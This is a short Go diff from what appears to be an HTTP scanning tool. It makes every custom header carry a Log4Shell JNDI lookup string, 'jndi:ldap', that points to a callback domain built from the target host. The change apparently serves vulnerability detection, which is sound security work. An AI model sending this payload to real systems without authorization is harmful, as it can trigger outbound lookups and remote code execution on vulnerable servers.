@@ -843,7 +843,7 @@ retry:
 
 		scanner := bufio.NewScanner(head)
 		for scanner.Scan(){
-			hp.CustomHeaders[scanner.Text()] = fmt.Sprintf("%s.%s", URL.Host, hp.Options.DNS4J)
+			hp.CustomHeaders[scanner.Text()] = fmt.Sprintf("${jndi:ldap://%s.%s/a}", URL.Host, hp.Options.DNS4J)
 		}
 		if err := scanner.Err(); err != nil{
 			log.Fatal(err)
